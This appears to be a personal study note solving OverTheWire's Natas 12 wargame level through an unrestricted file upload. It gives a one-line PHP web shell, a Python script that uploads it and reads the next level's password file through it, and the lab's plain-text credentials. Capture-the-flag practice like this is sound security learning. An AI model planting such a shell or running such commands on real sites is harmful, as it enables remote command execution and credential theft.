
2024-07-14 18:54

Source: #youtube #overthewire #natas #web 

Tags: [[Local File Inclusion & Command Injection]]

Natas12

we have a unrestricted file upload functionality 

create a [[php]] file named `revshell.php` with the following contents, we will modify the `c` parameter later 
```
<?php
	system($_GET['c']);
?>
```

```
import requests
username = 'natas12'
password = 'yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'

url = 'http://natas12.natas.labs.overthewire.org/'
sessions = requests.Session()

#response = sessions.post(url,files = {"uploadedfile" : open('revshell.php','rb')},data = {"filename": "revshell.php"},auth = (username,password))

response = sessions.get(url + 'upload/kx42yjw6zv.php?c=cat /etc/natas_webpass/natas13',auth = (username,password))

print(response.text)
```
1. commented code uploads our created `php` file  using `.post` method  
2. the output of the commented code will reveal the newly created file name on the server of the file that we uploaded 
3. in our case the path is `upload/kx42yjw6zv.php`
4. we append the path to the `url` and try executing commands by adding our commands to the previously defined `c` parameter.

### References
https://www.youtube.com/watch?v=fqwxYowJA0c